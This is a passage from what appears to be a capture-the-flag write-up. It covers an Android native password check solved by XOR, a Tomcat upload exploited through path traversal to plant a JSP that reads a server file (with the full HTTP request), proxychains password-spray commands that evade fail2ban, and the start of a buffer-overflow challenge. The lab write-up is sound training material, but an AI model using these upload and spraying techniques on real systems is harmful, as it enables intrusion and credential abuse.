</span></span><span class="line"><span class="cl">      <span class="n">pcVar3</span> <span class="o">=</span> <span class="nf">fgets</span><span class="p">(</span><span class="n">local_1038</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="n">__stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">pcVar3</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">bVar1</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">bVar2</span> <span class="o">=</span> <span class="n">bVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">__stream</span> <span class="o">==</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_001009f9</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LAB_001009f1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">pcVar3</span> <span class="o">=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">local_1038</span><span class="p">,</span><span class="s">&#34;Xposed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">bVar1</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">while</span> <span class="p">((</span><span class="n">pcVar3</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">pcVar3</span> <span class="o">=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">local_1038</span><span class="p">,</span><span class="s">&#34;frida&#34;</span><span class="p">),</span> <span class="n">pcVar3</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">bVar2</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">__stream</span> <span class="o">!=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_001009f1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">bVar1</span> <span class="o">=</span> <span class="n">bVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">fclose</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_001009f9</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bVar1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">curr_char_pass</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetIntArrayElements</span><span class="p">)(</span><span class="n">env</span><span class="p">,</span><span class="n">password</span><span class="p">,(</span><span class="n">jboolean</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="n">_expected_char</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">DAT_00100c8c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">((</span><span class="n">new_arr5</span> <span class="o">=</span> <span class="n">new_arr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">           <span class="p">((</span><span class="o">&amp;</span><span class="n">DAT_00100b20</span><span class="p">)[</span><span class="n">idx</span><span class="p">]</span> <span class="o">^</span> <span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">curr_char_pass</span> <span class="o">+</span> <span class="n">idx</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="o">*</span><span class="n">_expected_char</span><span class="p">)</span> <span class="o">==</span>
</span></span><span class="line"><span class="cl">           <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00100cc0</span><span class="p">)[</span><span class="n">idx</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">new_arr5</span> <span class="o">=</span> <span class="n">password</span><span class="p">,</span> <span class="n">idx</span> <span class="o">!=</span> <span class="mi">26</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">          <span class="p">(</span><span class="n">new_arr5</span> <span class="o">=</span> <span class="n">new_arr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="p">((</span><span class="o">&amp;</span><span class="n">DAT_00100b24</span><span class="p">)[</span><span class="n">idx</span><span class="p">]</span> <span class="o">^</span> <span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">curr_char_pass</span> <span class="o">+</span> <span class="n">idx</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="n">_expected_char</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">          <span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00100cc4</span><span class="p">)[</span><span class="n">idx</span><span class="p">]));</span> <span class="n">_expected_char</span> <span class="o">=</span> <span class="n">_expected_char</span> <span class="o">+</span> <span class="o">-</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">idx</span> <span class="o">=</span> <span class="n">idx</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span> <span class="o">!=</span> <span class="n">local_38</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">new_arr5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading the code, we know that the password length is 27, and the native lib have three different keys in the native (<code>key_a</code> which is <code>DAT_00100b20</code>, <code>key_b</code> which is <code>DAT_00100c8c</code> and <code>key_c</code> which is <code>DAT_00100cc0</code> ). What it do is
<code>input[i] ^ key_a[i] ^ key_b[-i] = key_c[i]</code>
And merging with the Login logic, the final operation would be
<code>password[i] ^ x0[i] ^ key_a[i] ^ key_b[-i] = key_c[i]</code>
So to generate the password (which is the flag), we just need to do:
<code>password[i] = x0[i] ^ key_a[i] ^ key_b[-i] ^ key_c[i]</code></p>
<p>Full code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">key_a</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xd0\x45\x28\x76\x6f\xf3\x5a\xf4\xc7\xce\xfb\xc3\x7f\x48\xce\x3c\x3a\x0b\xf1\x53\xb1\x4b\xb9\x5e\xa2\x65\x77</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">key_b</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x4c\x7b\x73\x6f\x72\x72\x79\x2e\x74\x68\x69\x73\x2e\x69\x73\x2e\x4e\x4f\x54\x2e\x74\x68\x65\x2e\x66\x6c\x61</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">key_c</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80\xe3\xda\xc7\x2e\xf1\xa2\x91\x6b\xdc\x6b\xb5\xe5\xaf\x3f\xb9\xee\x5b\x26\x92\x66\xc5\xcb\xde\x81\x79\xda</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">x0</span> <span class="o">=</span> <span class="p">[</span><span class="mi">121</span><span class="p">,</span> <span class="mi">134</span><span class="p">,</span> <span class="mi">239</span><span class="p">,</span> <span class="mi">213</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">150</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">170</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">159</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">205</span><span class="p">,</span> <span class="mi">223</span><span class="p">,</span> <span class="mi">218</span><span class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">219</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">156</span><span class="p">,</span> <span class="mi">237</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">178</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">180</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">192</span><span class="p">,</span> <span class="mi">178</span><span class="p">,</span> <span class="mi">234</span><span class="p">,</span> <span class="mi">228</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">142</span><span class="p">,</span> <span class="mi">242</span><span class="p">,</span> <span class="mi">142</span><span class="p">,</span> <span class="mi">133</span><span class="p">,</span> <span class="mi">159</span><span class="p">,</span> <span class="mi">142</span><span class="p">,</span> <span class="mi">33</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">27</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">key_a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">key_b</span><span class="p">[</span><span class="o">-</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)]</span><span class="o">^</span><span class="n">key_c</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">x0</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Flag: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Flag: HL{J4v4.nativ3.d0.n0t.c4r3}</p>
</blockquote>
<h1 id="web">Web</h1>
<h2 id="plupload">PLUpload</h2>
<p>I try to check <code>/examples</code> folder, and found out that this uses Apache Tomcat. After playing it for a while (especially on the upload feature), I notice that the upload feature doesn&rsquo;t sanitize <code>../</code>, which mean we can freely upload the file to any directories. Also inside the examples folder there are a lot of jsp file example that got executed.</p>
<p>My solution is to upload a jsp file to the examples folder path (<code>/examples/jsp/jsp2/el</code>) where the jsp file will open <code>/var/gold.txt</code> file contents.</p>
<p>Below is the jsp file</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="nd">@page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.FileInputStream&#34;</span><span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="nd">@page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.File&#34;</span><span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="nd">@page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.InputStreamReader&#34;</span><span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="nd">@page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.net.URL&#34;</span><span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="nd">@page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.FileReader&#34;</span><span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="nd">@page</span> <span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.BufferedReader&#34;</span><span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="nd">@page</span> <span class="n">contentType</span><span class="o">=</span><span class="s">&#34;text/html&#34;</span> <span class="n">pageEncoding</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">meta</span> <span class="n">http</span><span class="o">-</span><span class="n">equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="n">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=UTF-8&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">Read</span> <span class="n">Text</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">txtFilePath</span> <span class="o">=</span> <span class="s">&#34;/var/gold.txt&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">FileReader</span><span class="o">(</span><span class="n">txtFilePath</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">            <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">line</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">while</span><span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">())!=</span> <span class="kc">null</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">                <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">+</span><span class="s">&#34;\n&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span> 
</span></span><span class="line"><span class="cl">        <span class="o">%&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the upload request that I use to upload the jsp file to <code>../../examples/jsp/jsp2/el/cho.jsp</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST //upload HTTP/1.1
</span></span><span class="line"><span class="cl">Host: e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
</span></span><span class="line"><span class="cl">Accept: */*
</span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=---------------------------34999802810414628822789368601
</span></span><span class="line"><span class="cl">Content-Length: 1479
</span></span><span class="line"><span class="cl">Origin: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">Referer: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land/
</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=6E2119D7A2763AC0C88B4888A10C0E8B
</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-----------------------------34999802810414628822789368601
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;name&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">../../examples/jsp/jsp2/el/cho.jsp
</span></span><span class="line"><span class="cl">-----------------------------34999802810414628822789368601
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;chunk&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">0
</span></span><span class="line"><span class="cl">-----------------------------34999802810414628822789368601
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;chunks&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1
</span></span><span class="line"><span class="cl">-----------------------------34999802810414628822789368601
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;cho.jsp&#34;
</span></span><span class="line"><span class="cl">Content-Type: application/octet-stream
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;%@page import=&#34;java.io.FileInputStream&#34;%&gt;
</span></span><span class="line"><span class="cl">&lt;%@page import=&#34;java.io.File&#34;%&gt;
</span></span><span class="line"><span class="cl">&lt;%@page import=&#34;java.io.InputStreamReader&#34;%&gt;
</span></span><span class="line"><span class="cl">&lt;%@page import=&#34;java.net.URL&#34;%&gt;
</span></span><span class="line"><span class="cl">&lt;%@page import=&#34;java.io.FileReader&#34;%&gt;
</span></span><span class="line"><span class="cl">&lt;%@page import=&#34;java.io.BufferedReader&#34;%&gt;
</span></span><span class="line"><span class="cl">&lt;%@page contentType=&#34;text/html&#34; pageEncoding=&#34;UTF-8&#34;%&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
</span></span><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">    &lt;head&gt;
</span></span><span class="line"><span class="cl">        &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;
</span></span><span class="line"><span class="cl">        &lt;title&gt;Read Text&lt;/title&gt;
</span></span><span class="line"><span class="cl">    &lt;/head&gt;
</span></span><span class="line"><span class="cl">    &lt;body&gt;
</span></span><span class="line"><span class="cl">        &lt;%
</span></span><span class="line"><span class="cl">            String txtFilePath = &#34;/var/gold.txt&#34;;
</span></span><span class="line"><span class="cl">            BufferedReader reader = new BufferedReader(new FileReader(txtFilePath));
</span></span><span class="line"><span class="cl">            StringBuilder sb = new StringBuilder();
</span></span><span class="line"><span class="cl">            String line;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            while((line = reader.readLine())!= null){
</span></span><span class="line"><span class="cl">                sb.append(line+&#34;\n&#34;);
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">            out.println(sb.toString()); 
</span></span><span class="line"><span class="cl">        %&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    &lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span><span class="line"><span class="cl">-----------------------------34999802810414628822789368601--
</span></span></code></pre></td></tr></table>
</div>
</div><p>After upload it, we can simply open the file
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/a0sHb0o.png"
        data-srcset="https://i.imgur.com/a0sHb0o.png, https://i.imgur.com/a0sHb0o.png 1.5x, https://i.imgur.com/a0sHb0o.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/a0sHb0o.png"
        title="https://i.imgur.com/a0sHb0o.png" /></p>
<blockquote>
<p>Flag: New is always better. - Barney Stinson</p>
</blockquote>
<h1 id="misc">Misc</h1>
<h2 id="ctf-spray-attack-ssh">CTF Spray Attack SSH</h2>
<p>With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">proxychains sshpass -p <span class="m">93370760</span> ssh -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no user_100283@pwspray.vm.vuln.land -p <span class="m">22</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/mT0j5pe.png"
        data-srcset="https://i.imgur.com/mT0j5pe.png, https://i.imgur.com/mT0j5pe.png 1.5x, https://i.imgur.com/mT0j5pe.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/mT0j5pe.png"
        title="https://i.imgur.com/mT0j5pe.png" /></p>
<h2 id="ctf-spray-attack-http">CTF Spray Attack HTTP</h2>
<p>With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">proxychains curl --user user_140244:6ed42dd7 http://pwspray.vm.vuln.land -v
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/e3Yuq6D.png"
        data-srcset="https://i.imgur.com/e3Yuq6D.png, https://i.imgur.com/e3Yuq6D.png 1.5x, https://i.imgur.com/e3Yuq6D.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/e3Yuq6D.png"
        title="https://i.imgur.com/e3Yuq6D.png" /></p>
<h1 id="pwn">Pwn</h1>
<h2 id="crysys">CrySYS</h2>
<p>We were given a binary that is pretty short</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">//gcc -o challenge -no-pie -fno-stack-protector challenges.c
</span></span></span><span class="line"><span class="cl"><span class="c1">//LD_PRELOAD=./libc-2.27.so ./ld-2.27.so ./challenge
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">not_vulnerable</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">	<span class="nf">not_vulnerable</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
